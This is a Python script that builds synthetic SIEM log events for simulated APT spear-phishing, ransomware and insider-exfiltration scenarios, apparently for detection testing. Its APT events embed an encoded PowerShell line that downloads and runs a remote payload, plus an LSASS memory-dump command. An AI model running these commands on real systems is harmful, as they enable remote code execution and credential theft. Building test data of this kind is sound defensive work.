#!/usr/bin/env python3
"""
🔐 Simple Attack Chain Generator
===============================
Generates realistic, correlated attack scenarios for testing SIEM correlation capabilities.
"""

import asyncio
from datetime import datetime, timedelta
import random
import json
from typing import List, Dict, Any
from dataclasses import dataclass


@dataclass
class VictimProfile:
    """Target victim profile for attack scenarios"""
    username: str
    hostname: str
    ip_address: str
    role: str
    domain: str


@dataclass
class AttackScenario:
    """Complete attack chain scenario"""
    name: str
    description: str
    mitre_tactics: List[str]
    mitre_techniques: List[str]
    duration: timedelta
    victim: VictimProfile
    events: List[Dict[str, Any]]


class SimpleAttackChainGenerator:
    """Generates sophisticated, multi-stage attack scenarios"""
    
    def __init__(self):
        # Victim profiles for realistic scenarios
        self.victim_profiles = [
            VictimProfile(
                username="sarah.johnson",
                hostname="FINANCE-WS01",
                ip_address="10.0.2.15",
                role="Finance Manager",
                domain="contoso.com"
            ),
            VictimProfile(
                username="mike.chen",
                hostname="IT-ADMIN-01",
                ip_address="10.0.1.10",
                role="System Administrator",
                domain="contoso.com"
            ),
            VictimProfile(
                username="lisa.anderson",
                hostname="HR-WORKSTATION",
                ip_address="10.0.3.25",
                role="HR Director", 
                domain="contoso.com"
            )
        ]
    
    async def generate_apt_spearphishing_attack(self, victim: VictimProfile) -> AttackScenario:
        """Generate APT29-style spear-phishing attack chain"""
        base_time = datetime.now() - timedelta(hours=2)
        events = []
        
        # Stage 1: Email delivery
        events.append({
            "@timestamp": base_time.isoformat(),
            "event": {
                "category": ["network"],
                "type": ["connection"],
                "action": "email_received"
            },
            "source": {"ip": "185.220.101.182", "port": 587},
            "destination": {"ip": victim.ip_address, "port": 25},
            "network": {"protocol": "smtp"},
            "user": {"name": victim.username},
            "host": {"name": victim.hostname},
            "email": {
                "from": "finance-team@company-updates.net",
                "subject": "Urgent: Q4 Financial Review Required",
                "attachment_count": 1,
                "attachment_names": ["Financial_Report_Q4.docx"]
            },
            "threat": {
                "actor": "APT29",
                "campaign": "CozyBear_Q4_2024",
                "technique": "T1566.001"
            }
        })
        
        # Stage 2: Malicious document opened
        events.append({
            "@timestamp": (base_time + timedelta(minutes=15)).isoformat(),
            "event": {
                "category": ["process"],
                "type": ["start"],
                "action": "process_started"
            },
            "host": {"name": victim.hostname},
            "user": {"name": victim.username},
            "process": {
                "name": "WINWORD.EXE",
                "pid": random.randint(3000, 9999),
                "command_line": f'"C:\\Program Files\\Microsoft Office\\Office16\\WINWORD.EXE" "C:\\Users\\{victim.username}\\Downloads\\Financial_Report_Q4.docx"',
                "parent": {"name": "explorer.exe"},
                "executable": "C:\\Program Files\\Microsoft Office\\Office16\\WINWORD.EXE"
            },
            "file": {
                "name": "Financial_Report_Q4.docx",
                "path": f"C:\\Users\\{victim.username}\\Downloads\\Financial_Report_Q4.docx",
                "hash": {"sha256": "a1b2c3d4e5f6789012345678901234567890abcdef"}
            }
        })
        
        # Stage 3: PowerShell execution
        events.append({
            "@timestamp": (base_time + timedelta(minutes=16)).isoformat(),
            "event": {
                "category": ["process"],
                "type": ["start"],
                "action": "powershell_execution"
            },
            "host": {"name": victim.hostname},
            "user": {"name": victim.username},
            "process": {
                "name": "powershell.exe",
                "pid": random.randint(1000, 9999),
                "command_line": 'powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4AMQA4ADIALwBwAGEAeQBsAG8AYQBkAC4AdAB4AHQAIgApAA==',
                "parent": {"name": "WINWORD.EXE"}
            },
            "threat": {
                "technique": "T1059.001",
                "tactic": "Execution"
            }
        })
        
        # Stage 4: C2 communication
        events.append({
            "@timestamp": (base_time + timedelta(minutes=17)).isoformat(),
            "event": {
                "category": ["network"],
                "type": ["connection"],
                "action": "connection_established"
            },
            "source": {"ip": victim.ip_address, "port": random.randint(50000, 60000)},
            "destination": {"ip": "185.220.101.182", "port": 443},
            "network": {"protocol": "https"},
            "user": {"name": victim.username},
            "host": {"name": victim.hostname},
            "tls": {"server_name": "update-service.company-cdn.net"},
            "threat": {
                "technique": "T1071.001",
                "tactic": "Command and Control",
                "indicator_type": "C2_COMMUNICATION"
            }
        })
        
        # Stage 5: Credential dumping
        events.append({
            "@timestamp": (base_time + timedelta(minutes=25)).isoformat(),
            "event": {
                "category": ["process"],
                "type": ["start"],
                "action": "credential_dumping"
            },
            "host": {"name": victim.hostname},
            "user": {"name": victim.username},
            "process": {
                "name": "rundll32.exe",
                "pid": random.randint(1000, 9999),
                "command_line": 'rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 720 C:\\Windows\\Temp\\lsass.dmp full',
                "parent": {"name": "powershell.exe"}
            },
            "threat": {
                "technique": "T1003.001",
                "tactic": "Credential Access"
            }
        })
        
        # Stage 6: Lateral movement attempt
        events.append({
            "@timestamp": (base_time + timedelta(minutes=45)).isoformat(),
            "event": {
                "category": ["authentication"],
                "type": ["start"],
                "outcome": "failure"
            },
            "source": {"ip": victim.ip_address},
            "destination": {"ip": "10.0.1.10"},
            "user": {
                "name": "mike.chen",
                "domain": victim.domain
            },
            "host": {"name": "IT-ADMIN-01"},
            "related": {"user": ["mike.chen"]},
            "threat": {
                "technique": "T1021.002",
                "tactic": "Lateral Movement"
            }
        })
        
        return AttackScenario(
            name="APT29 Spear-phishing Attack",
            description="Multi-stage APT attack using spear-phishing, macro execution, credential dumping, and lateral movement",
            mitre_tactics=["Initial Access", "Execution", "Credential Access", "Lateral Movement", "Command and Control"],
            mitre_techniques=["T1566.001", "T1059.001", "T1003.001", "T1021.002", "T1071.001"],
            duration=timedelta(hours=1),
            victim=victim,
            events=events
        )
    
    async def generate_ransomware_attack(self, victim: VictimProfile) -> AttackScenario:
        """Generate ransomware attack scenario"""
        base_time = datetime.now() - timedelta(hours=1)
        events = []
        
        # Stage 1: Initial infection
        events.append({
            "@timestamp": base_time.isoformat(),
            "event": {
                "category": ["process"],
                "type": ["start"],
                "action": "malware_execution"
            },
            "host": {"name": victim.hostname},
            "user": {"name": victim.username},
            "process": {
                "name": "invoice_2024.exe",
                "pid": random.randint(3000, 9999),
                "command_line": f'"C:\\Users\\{victim.username}\\Downloads\\invoice_2024.exe"',
                "parent": {"name": "explorer.exe"},
                "hash": {"sha256": "b4d455c7e8f9a1b2c3d4e5f67890abcdef1234567890"}
            },
            "file": {
                "name": "invoice_2024.exe",
                "path": f"C:\\Users\\{victim.username}\\Downloads\\invoice_2024.exe"
            },
            "threat": {
                "technique": "T1204.002",
                "tactic": "Execution",
                "malware_family": "Ryuk"
            }
        })
        
        # Stage 2: File encryption
        events.append({
            "@timestamp": (base_time + timedelta(minutes=5)).isoformat(),
            "event": {
                "category": ["file"],
                "type": ["change"],
                "action": "file_encrypted"
            },
            "user": {"name": victim.username},
            "host": {"name": victim.hostname},
            "file": {
                "name": "document.txt.locked",
                "path": f"C:\\Users\\{victim.username}\\Documents\\document.txt.locked",
                "extension": "locked"
            },
            "process": {
                "name": "invoice_2024.exe",
                "pid": events[-1]["process"]["pid"]
            },
            "threat": {
                "technique": "T1486",
                "tactic": "Impact",
                "malware_family": "Ryuk"
            }
        })
        
        # Stage 3: Ransom note
        events.append({
            "@timestamp": (base_time + timedelta(minutes=10)).isoformat(),
            "event": {
                "category": ["file"],
                "type": ["creation"],
                "action": "ransom_note_created"
            },
            "user": {"name": victim.username},
            "host": {"name": victim.hostname},
            "file": {
                "name": "READ_ME_FOR_DECRYPT.txt",
                "path": f"C:\\Users\\{victim.username}\\Desktop\\READ_ME_FOR_DECRYPT.txt",
                "content": "Your files have been encrypted! Contact us for decryption key..."
            },
            "process": {
                "name": "invoice_2024.exe"
            }
        })
        
        return AttackScenario(
            name="Ransomware Attack - Ryuk",
            description="Ransomware attack encrypting user files and demanding payment",
            mitre_tactics=["Execution", "Impact"],
            mitre_techniques=["T1204.002", "T1486"],
            duration=timedelta(minutes=15),
            victim=victim,
            events=events
        )
    
    async def generate_insider_threat_scenario(self, victim: VictimProfile) -> AttackScenario:
        """Generate insider threat scenario"""
        base_time = datetime.now() - timedelta(hours=4)
        events = []
        
        # Stage 1: Off-hours access
        events.append({
            "@timestamp": base_time.isoformat(),
            "event": {
                "category": ["authentication"],
                "type": ["start"],
                "outcome": "success"
            },
            "user": {"name": victim.username},
            "host": {"name": victim.hostname},
            "source": {"ip": "192.168.1.100"},  # Home IP
            "logon": {
                "type": "RemoteInteractive",
                "time": "02:30:00"  # Unusual time
            },
            "threat": {
                "technique": "T1078",
                "tactic": "Initial Access"
            }
        })
        
        # Stage 2: Sensitive file access
        events.append({
            "@timestamp": (base_time + timedelta(minutes=10)).isoformat(),
            "event": {
                "category": ["file"],
                "type": ["access"],
                "action": "file_opened"
            },
            "user": {"name": victim.username},
            "host": {"name": victim.hostname},
            "file": {
                "name": "Employee_Salaries_2024.xlsx",
                "path": "\\\\FILESERVER\\HR\\Confidential\\Employee_Salaries_2024.xlsx",
                "extension": "xlsx",
                "type": "file"
            },
            "process": {
                "name": "EXCEL.EXE",
                "command_line": '"C:\\Program Files\\Microsoft Office\\Office16\\EXCEL.EXE" "\\\\FILESERVER\\HR\\Confidential\\Employee_Salaries_2024.xlsx"'
            }
        })
        
        # Stage 3: Data exfiltration
        events.append({
            "@timestamp": (base_time + timedelta(minutes=20)).isoformat(),
            "event": {
                "category": ["file"],
                "type": ["creation"],
                "action": "file_copied"
            },
            "user": {"name": victim.username},
            "host": {"name": victim.hostname},
            "file": {
                "name": "backup_data.zip",
                "path": "E:\\backup_data.zip",  # USB drive
                "size": 25600000
            },
            "process": {
                "name": "explorer.exe"
            },
            "threat": {
                "technique": "T1052.001",
                "tactic": "Exfiltration"
            }
        })
        
        return AttackScenario(
            name="Insider Threat - Data Exfiltration",
            description="Malicious insider accessing and exfiltrating sensitive HR data during off-hours",
            mitre_tactics=["Initial Access", "Collection", "Exfiltration"],
            mitre_techniques=["T1078", "T1005", "T1052.001"],
            duration=timedelta(minutes=30),
            victim=victim,
            events=events
        )


async def main():
    """Run attack chain generation and analysis"""
    print("🔐 SIMPLE ATTACK CHAIN GENERATOR")
    print("=" * 50)
    print("Generating realistic attack scenarios for SIEM testing")
    print()
    
    generator = SimpleAttackChainGenerator()
    scenarios = []
    
    print("🎯 Generating Attack Scenarios...")
    print("-" * 35)
    
    # Generate different attack types
    victim1 = random.choice(generator.victim_profiles)
    apt_scenario = await generator.generate_apt_spearphishing_attack(victim1)
    scenarios.append(apt_scenario)
    print(f"✅ Generated: {apt_scenario.name} (Target: {victim1.username})")
    
    victim2 = random.choice(generator.victim_profiles)
    ransomware_scenario = await generator.generate_ransomware_attack(victim2)
    scenarios.append(ransomware_scenario)
    print(f"✅ Generated: {ransomware_scenario.name} (Target: {victim2.username})")
    
    victim3 = random.choice(generator.victim_profiles)
    insider_scenario = await generator.generate_insider_threat_scenario(victim3)
    scenarios.append(insider_scenario)
    print(f"✅ Generated: {insider_scenario.name} (Target: {victim3.username})")
    
    print()
    print("📊 ATTACK CHAIN ANALYSIS")
    print("=" * 50)
    
    total_events = 0
    all_techniques = set()
    all_tactics = set()
    
    for i, scenario in enumerate(scenarios, 1):
        print(f"\n🎯 Scenario {i}: {scenario.name}")
        print(f"   📝 Description: {scenario.description}")
        print(f"   👤 Target: {scenario.victim.username} ({scenario.victim.role})")
        print(f"   ⏱️  Duration: {scenario.duration}")
        print(f"   📊 Events: {len(scenario.events)}")
        print(f"   🎭 MITRE Tactics: {', '.join(scenario.mitre_tactics)}")
        print(f"   🔧 MITRE Techniques: {', '.join(scenario.mitre_techniques)}")
        
        total_events += len(scenario.events)
        all_techniques.update(scenario.mitre_techniques)
        all_tactics.update(scenario.mitre_tactics)
        
        # Show event timeline
        print(f"   📅 Event Timeline:")
        for j, event in enumerate(scenario.events[:3]):  # Show first 3 events
            event_time = event.get("@timestamp", "N/A")
            event_type = event.get("event", {}).get("action", "unknown")
            print(f"      {j+1}. {event_time}: {event_type}")
        if len(scenario.events) > 3:
            print(f"      ... and {len(scenario.events) - 3} more events")
    
    print(f"\n📈 OVERALL STATISTICS")
    print("-" * 25)
    print(f"Total Scenarios: {len(scenarios)}")
    print(f"Total Events Generated: {total_events}")
    print(f"Unique MITRE Techniques: {len(all_techniques)}")
    print(f"Unique MITRE Tactics: {len(all_tactics)}")
    print(f"Coverage: {', '.join(sorted(all_tactics))}")
    
    # Save scenario data
    report_data = {
        "generated_at": datetime.now().isoformat(),
        "total_scenarios": len(scenarios),
        "total_events": total_events,
        "scenarios": []
    }
    
    for scenario in scenarios:
        scenario_data = {
            "name": scenario.name,
            "description": scenario.description,
            "victim": {
                "username": scenario.victim.username,
                "hostname": scenario.victim.hostname,
                "role": scenario.victim.role
            },
            "mitre_tactics": scenario.mitre_tactics,
            "mitre_techniques": scenario.mitre_techniques,
            "event_count": len(scenario.events),
            "duration_minutes": scenario.duration.total_seconds() / 60,
            "events": scenario.events
        }
        report_data["scenarios"].append(scenario_data)
    
    # Write detailed report
    try:
        with open("simple_attack_chain_analysis.json", "w", encoding="utf-8") as f:
            json.dump(report_data, f, indent=2, ensure_ascii=False)
        print(f"\n💾 Attack chain analysis saved to: simple_attack_chain_analysis.json")
    except Exception as e:
        print(f"\n⚠️  Could not save report: {e}")
    
    print("\n🎯 ATTACK CHAIN GENERATION COMPLETE")
    print("=" * 50)
    print(f"🟢 Status: Successfully generated {len(scenarios)} realistic attack scenarios")
    print(f"📊 Ready for SIEM correlation testing and threat hunting validation")
    print(f"🔍 Each scenario contains detailed event chains with MITRE ATT&CK mapping")


if __name__ == "__main__":
    asyncio.run(main())
